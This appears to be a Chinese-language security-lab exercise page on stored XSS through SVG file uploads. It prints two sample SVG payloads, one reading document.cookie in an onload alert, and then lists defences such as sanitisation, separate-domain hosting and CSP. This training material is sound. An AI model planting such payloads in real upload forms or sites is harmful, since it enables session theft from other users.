Level 13: SVG 文件上传 XSS

中等

关卡说明

服务端允许上传 SVG 图片。SVG 是 XML 格式，支持内嵌 JavaScript。

上传含恶意 JS 的 SVG 后，其他用户访问该文件时触发存储型 XSS。

{% with messages = get_flashed_messages(with_categories=true) %} {% if messages %}{% for category, message in messages %}
{{ message }}

攻击 Payload 示例

上传以下内容的 xss.svg：

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100" height="100"/>
</svg>

或者使用 script 标签：

<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

防御方案

  • 禁止上传 SVG，或对 SVG 进行净化（移除脚本元素）
  • 上传文件通过独立域名访问（隔离 cookie），设置 Content-Disposition: attachment
  • 响应头添加 Content-Security-Policy 限制脚本执行
